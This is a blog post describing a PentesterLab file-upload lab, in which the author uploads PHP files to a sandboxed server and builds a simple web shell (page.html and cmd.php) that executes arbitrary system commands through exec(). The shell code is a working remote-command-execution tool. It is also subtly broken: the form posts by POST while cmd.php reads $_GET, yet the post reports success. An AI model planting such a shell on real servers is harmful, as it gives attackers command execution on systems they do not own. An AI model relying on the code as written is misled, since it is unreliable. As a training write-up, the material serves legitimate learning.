# Baby's first PHP shell
I previously had been auditing a course here at Portland State for web application security -- the faculty provides all the course material for free online, so anyone can take a look at it. The aim of the course is to get students familiar with basic security principles -- things to watch out for when developing hosted applications and how web applications behave in comparison to desktop or server-based programs. A server-side application may have a vulnerability in terms of passing un-validated data for execution, but that has a different threat model in comparison to a public website. Either way, the point is to instill best practices and have this cascade over to other development projects.

For our testing sandbox, we relied on pre-configured images from PentesterLab (link below for the curious)

Pentester Lab is a great resource that provides guides on how to execute various exploits -- SQL injections, XSS attacks, and (what we're talking about today) PHP shells, to name a few.

I have some experience with web site exploitation but have never really executed a PHP shell attack -- I really had only heard the words "PHP Shell" and knew nothing past that point. I set up the ISO in Virtual Box locally and fired it up to get started.

Clicking on the File Upload 1 exercise, if we successfully upload a file we receive this response:

![Upload](/thumbnails/2020-03-14/1UploadProcess.png)

Clicking on the link in the response takes us directly to the image as well as shows where that image is on the server. From this URL, we can tell exactly where the file is on the server as well.

Most websites nowadays screen for the filetype that's being uploaded to prevent remote code execution as a precaution. Instead of a jpeg, I'm going to upload a PHP file, which, if executed, will show the version of PHP running on the server. You can create this file by typing the following into a file and saving it off as a .php file -- the name does not matter.

`<?php phpinfo();?>`

That's all! The ?php portion initializes PHP by saying, "I am going to run a PHP function." The phpinfo(); is the actual function call which shows PHP's configuration on this server.

![PHP Info](/thumbnails/2020-03-14/3phpinfo.png)

Success! So what other commands can we send to this server through the file upload feature? PHP has a couple of functions that we can use to accomplish this if we combine them together.

The PHP exec command will accept a system command as an argument and can store the result as a variable. The echo command works the same as on the command line -- it'll show whatever is passed to it to the screen. You can read more about both these commands here in the PHP manual:

https://www.php.net/manual/en/function.exec.php
https://www.php.net/manual/en/function.echo.php

So what if we modify that phpinfo file to list what directory we are in by executing the pwd linux command?

    <?php echo exec("pwd")?>

![PWD](/thumbnails/2020-03-14/4pwd.png)

I am a bit lazy, though, and don't want to have to upload a file every single time that I want to execute a command, so let's make an html form that passes a command to be executed by the php. I'll split this out into two files -- page.html will have all form materials and cmd.php will execute the command.

## page.html
    <html>
    <body>
    <form method="POST" action="cmd.php">
        <input type="text" id="command" name="command" >
            <input type="submit" name="submit">
    </form>
    </body>
    </html>

## cmd.php

    <html>
    <body>
    <?php
    $var = $_GET['command'];
    echo exec($var);
    ?>
    </body>
    </html>

Now, when I type a command into here and submit...
![Execute](/thumbnails/2020-03-14/5query.png)

I get a new page with the results!
![Result](/thumbnails/2020-03-14/6catResult.png)
